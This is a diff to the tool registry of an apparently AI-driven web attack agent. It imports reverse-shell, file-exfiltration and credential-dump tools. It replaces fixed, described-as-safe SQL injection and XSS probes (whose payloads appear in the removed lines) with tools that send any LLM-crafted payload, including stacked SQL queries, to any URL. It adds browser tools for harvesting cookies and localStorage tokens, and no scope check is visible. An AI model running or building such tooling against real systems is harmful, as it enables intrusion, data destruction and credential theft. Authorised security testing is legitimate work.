@@ -20,7 +20,7 @@ import { createSessionCheckTool, createLoginMacroTool } from './auth-scan';
 import { createFileExfilTool, createReverseShellTool, createCredDumpTool } from './post-exploit';
 import { createOOBTriggerTool } from './oob-trigger';
 import { createOOBFindTool } from './oob-find';
-import { createBrowserNavigateTool, createBrowserClickTool, createBrowserFillTool, createBrowserPressKeyTool, createBrowserScreenshotTool, createBrowserExtractTool, createBrowserEvaluateTool, createBrowserCloseTool, createBrowserStartRecordingTool, createBrowserStopRecordingTool, createBrowserGetRecordingTool, createBrowserStartTraceTool, createBrowserStopTraceTool, createBrowserGetTraceTool } from './browser-tools';
+import { createBrowserNavigateTool, createBrowserClickTool, createBrowserFillTool, createBrowserPressKeyTool, createBrowserScreenshotTool, createBrowserExtractTool, createBrowserEvaluateTool, createBrowserCloseTool, createBrowserStartRecordingTool, createBrowserStopRecordingTool, createBrowserGetRecordingTool, createBrowserStartTraceTool, createBrowserStopTraceTool, createBrowserGetTraceTool, createBrowserGetFormsTool, createBrowserGetCookiesTool, createBrowserGetScriptsTool, createBrowserGetStorageTool } from './browser-tools';
 import { createGeneratePlaywrightTestTool } from './test-gen-tool';
 import { createBuildFlowFromTraceTool } from '../flow/build-from-trace';
 import { OOBServer } from '../core/oob-server';
@@ -777,78 +777,69 @@ toolRegistry.register({
 
 // ── Exploit Testing Tools ──
 
-const SqlInjectSchema = z.object({ url: z.string().describe('Target URL with vulnerable parameter'), paramName: z.string().optional().describe('Query/body parameter name to test for SQL injection (e.g. "id", "username"). If omitted, auto-detected from URL or common parameters.'), method: z.string().optional().default('GET').describe('HTTP method') });
+const SqlInjectSchema = z.object({
+  url: z.string().describe('Target URL to test'),
+  paramName: z.string().describe('Parameter name to inject into'),
+  payload: z.string().describe('SQL injection payload crafted by the LLM based on previous response analysis'),
+  method: z.string().optional().default('GET').describe('HTTP method'),
+  technique: z.string().optional().describe('Injection technique (e.g. "boolean", "union", "time-based", "error-based", "stacked")'),
+});
 
 toolRegistry.register({
   name: 'sql_inject',
   category: 'exploit',
-  description: 'Test parameters for SQL injection using safe, non-destructive payloads',
+  description: 'Inject a crafted SQL payload into a parameter and return the full response, timing, and any database error messages for the LLM to analyze and refine the next payload',
   tags: ['sqli', 'injection', 'exploit', 'testing'],
   factory: () => tool(async (input) => {
-    const { url, paramName, method } = SqlInjectSchema.parse(u(input));
-    const params = paramName ? [paramName] : (() => {
-      const qs = url.includes('?') ? new URL(url).searchParams : null;
-      return qs && qs.size > 0 ? Array.from(qs.keys()).filter(k => k !== 'utm_source' && k !== 'utm_medium') : ['q', 'id', 'search', 'name'];
-    })();
-    const payloads = [
-      { payload: "' OR 1=1--", desc: 'Boolean-based blind' },
-      { payload: "' UNION SELECT NULL--", desc: 'UNION-based' },
-      { payload: "'; WAITFOR DELAY '0:0:5'--", desc: 'Time-based blind' },
-      { payload: "' AND SLEEP(5)--", desc: 'Time-based (MySQL)' },
-      { payload: "1' ORDER BY 1--", desc: 'ORDER BY enumeration' },
-    ];
-    const results: Array<{ desc: string; payload: string; status: number; time: number; indicator: string }> = [];
-    for (const p of params) {
-      for (const { payload, desc } of payloads) {
-        const start = Date.now();
-        try {
-          const testUrl = method === 'GET' ? `${url}${url.includes('?') ? '&' : '?'}${p}=${encodeURIComponent(payload)}` : url;
-          const res = await fetch(testUrl, { method, headers: method === 'POST' ? { 'Content-Type': 'application/x-www-form-urlencoded' } : {}, body: method === 'POST' ? `${p}=${encodeURIComponent(payload)}` : undefined });
-          const text = await res.text();
-          const time = Date.now() - start;
-          let indicator = 'No obvious SQLi indicator';
-          if (text.toLowerCase().includes('sql syntax') || text.toLowerCase().includes('sql error')) indicator = '⚠️ SQL error message detected';
-          if (text.toLowerCase().includes('warning') && text.toLowerCase().includes('mysql')) indicator = '⚠️ MySQL warning detected';
-          if (time > 4000) indicator = '⚠️ Time delay detected — possible blind SQLi';
-          results.push({ desc, payload, status: res.status, time, indicator });
-        } catch (error) { results.push({ desc, payload, status: 0, time: Date.now() - start, indicator: `Error: ${error instanceof Error ? error.message : String(error)}` }); }
-      }
+    const { url, paramName, payload, method, technique } = SqlInjectSchema.parse(u(input));
+    const start = Date.now();
+    try {
+      const testUrl = method === 'GET' ? `${url}${url.includes('?') ? '&' : '?'}${paramName}=${encodeURIComponent(payload)}` : url;
+      const res = await fetch(testUrl, {
+        method,
+        headers: method === 'POST' ? { 'Content-Type': 'application/x-www-form-urlencoded' } : {},
+        body: method === 'POST' ? `${paramName}=${encodeURIComponent(payload)}` : undefined,
+      });
+      const body = await res.text();
+      const elapsed = Date.now() - start;
+      return JSON.stringify({ status: res.status, time: elapsed, bodyLength: body.length, bodyPreview: body.slice(0, 2000), technique: technique || 'unknown', paramName });
+    } catch (error) {
+      return JSON.stringify({ status: 0, time: Date.now() - start, error: error instanceof Error ? error.message : String(error), technique: technique || 'unknown', paramName });
     }
-    const paramLabel = params.join(', ');
-    return `SQL Injection Test for ${method} ${url}?${paramLabel}=...\n\n${results.map((r) => `- [${r.desc}] ${r.payload.slice(0, 30)}\n  Status: ${r.status}, Time: ${r.time}ms\n  ${r.indicator}`).join('\n\n')}`;
-  }, { name: 'sql_inject', description: 'Test for SQL injection', schema: SqlInjectSchema }),
+  }, { name: 'sql_inject', description: 'Inject a SQL payload into a parameter', schema: SqlInjectSchema }),
 });
 
-const XssInjectSchema = z.object({ url: z.string().describe('Target URL with vulnerable parameter'), paramName: z.string().optional().describe('Query/body parameter name to test for XSS (e.g. "q", "search", "name"). If omitted, auto-detected from URL or common parameters.'), method: z.string().optional().default('GET').describe('HTTP method') });
+const XssInjectSchema = z.object({
+  url: z.string().describe('Target URL to test'),
+  paramName: z.string().describe('Parameter name to inject into'),
+  payload: z.string().describe('XSS payload crafted by the LLM. Adapt the payload based on reflection context — attribute, script, comment, or URL'),
+  method: z.string().optional().default('GET').describe('HTTP method'),
+  context: z.string().optional().describe('Reflection context: "attribute", "script", "comment", "url", "html", "unknown"'),
+});
 
 toolRegistry.register({
   name: 'xss_inject',
   category: 'exploit',
-  description: 'Test parameters for XSS using safe payloads that detect reflection without executing',
+  description: 'Inject a crafted XSS payload into a parameter and return the response with reflection analysis — whether and how the payload was reflected, encoded, or blocked',
   tags: ['xss', 'injection', 'exploit', 'testing'],
   factory: () => tool(async (input) => {
-    const { url, paramName, method } = XssInjectSchema.parse(u(input));
-    const payloads = [
-      { payload: '<script>alert(1)</script>', desc: 'Basic reflected XSS' },
-      { payload: '<img src=x onerror=alert(1)>', desc: 'Event handler XSS' },
-      { payload: '"><script>alert(1)</script>', desc: 'Attribute break XSS' },
-      { payload: "javascript:alert(1)", desc: 'JavaScript URI' },
-      { payload: '<svg onload=alert(1)>', desc: 'SVG-based XSS' },
-    ];
-    const results: Array<{ desc: string; reflected: boolean; encoded: boolean; status: number }> = [];
-    for (const { payload, desc } of payloads) {
-      try {
-        const testUrl = method === 'GET' ? `${url}${url.includes('?') ? '&' : '?'}${paramName}=${encodeURIComponent(payload)}` : url;
-        const res = await fetch(testUrl, { method, body: method === 'POST' ? `${paramName}=${encodeURIComponent(payload)}` : undefined });
-        const text = await res.text();
-        const reflected = text.includes(payload);
-        const encoded = text.includes(encodeURIComponent(payload).replace(/%/g, '%25')) || text.includes('&lt;script');
-        results.push({ desc, reflected, encoded, status: res.status });
-      } catch { results.push({ desc, reflected: false, encoded: false, status: 0 }); }
+    const { url, paramName, payload, method, context } = XssInjectSchema.parse(u(input));
+    try {
+      const testUrl = method === 'GET' ? `${url}${url.includes('?') ? '&' : '?'}${paramName}=${encodeURIComponent(payload)}` : url;
+      const res = await fetch(testUrl, { method, body: method === 'POST' ? `${paramName}=${encodeURIComponent(payload)}` : undefined });
+      const body = await res.text();
+      const reflected = body.includes(payload);
+      const encoded = body.includes(encodeURIComponent(payload).replace(/%/g, '%25')) || body.includes('&lt;script');
+      const contextHints = [];
+      if (body.includes(`="${payload}"`)) contextHints.push('reflected-in-attribute');
+      if (body.includes(`>${payload}<`)) contextHints.push('reflected-in-html');
+      if (body.includes(`//${payload}`)) contextHints.push('reflected-in-script');
+      if (body.includes(`<!--${payload}`)) contextHints.push('reflected-in-comment');
+      return JSON.stringify({ status: res.status, reflected, encoded, contextHints, context, bodyLength: body.length, bodyPreview: body.slice(0, 2000), paramName });
+    } catch (error) {
+      return JSON.stringify({ status: 0, error: error instanceof Error ? error.message : String(error), context, paramName });
     }
-    const vulnerable = results.filter((r) => r.reflected && !r.encoded);
-    return `XSS Test for ${method} ${url}?${paramName}=...\n\n${results.map((r) => `- [${r.desc}] Reflected: ${r.reflected}, Encoded: ${r.encoded}, Status: ${r.status}`).join('\n')}\n\n${vulnerable.length > 0 ? `⚠️ VULNERABLE: ${vulnerable.length} payloads reflected without encoding` : '✅ No reflected XSS detected — payloads were encoded or not reflected'}`;
-  }, { name: 'xss_inject', description: 'Test for XSS vulnerabilities', schema: XssInjectSchema }),
+  }, { name: 'xss_inject', description: 'Inject an XSS payload into a parameter', schema: XssInjectSchema }),
 });
 
 toolRegistry.register({
@@ -1130,6 +1121,38 @@ toolRegistry.register({
   description: 'Execute JavaScript in the browser session page context',
   tags: ['browser', 'playwright', 'javascript', 'evaluation'],
   factory: () => createBrowserEvaluateTool(),
+});
+
+toolRegistry.register({
+  name: 'browser_get_forms',
+  category: 'browser',
+  description: 'Extract all forms from the current page with fields, actions, and methods for security analysis',
+  tags: ['browser', 'forms', 'recon', 'analysis'],
+  factory: () => createBrowserGetFormsTool(),
+});
+
+toolRegistry.register({
+  name: 'browser_get_cookies',
+  category: 'browser',
+  description: 'Get all cookies for the current page context including httpOnly, secure, sameSite flags',
+  tags: ['browser', 'cookies', 'auth', 'recon'],
+  factory: () => createBrowserGetCookiesTool(),
+});
+
+toolRegistry.register({
+  name: 'browser_get_scripts',
+  category: 'browser',
+  description: 'List all external scripts loaded on the current page for supply chain analysis',
+  tags: ['browser', 'scripts', 'recon', 'supply-chain'],
+  factory: () => createBrowserGetScriptsTool(),
+});
+
+toolRegistry.register({
+  name: 'browser_get_storage',
+  category: 'browser',
+  description: 'Get all localStorage entries for the current page origin — useful for finding tokens, secrets, app state',
+  tags: ['browser', 'storage', 'tokens', 'recon'],
+  factory: () => createBrowserGetStorageTool(),
 });
 
 toolRegistry.register({
